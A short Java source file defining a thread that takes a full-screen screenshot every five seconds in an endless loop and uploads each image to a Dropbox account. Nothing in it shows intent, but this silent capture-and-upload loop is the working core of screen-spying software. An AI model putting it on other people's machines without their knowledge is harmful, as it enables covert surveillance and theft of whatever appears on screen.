import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.FileMetadata;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MyThread extends Thread {

    private DbxClientV2 client;

    public MyThread(DbxClientV2 client){
        this.client = client;
    }

    @Override
    public void run() {
        super.run();

        for(;;) {

            try {

                BufferedImage bufferedImage = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                DateFormat dateFormat = new SimpleDateFormat("yyyyMMdd_HHmmss");
                Date today = new Date();

                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                ImageIO.write(bufferedImage, "png", baos);
                ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());

                FileMetadata metadata = client.files().uploadBuilder("/" + dateFormat.format(today)+ ".png")
                        .uploadAndFinish(bais);
                sleep(5000);

            } catch (Exception e) {
                e.printStackTrace();
            }

        }
    }
}
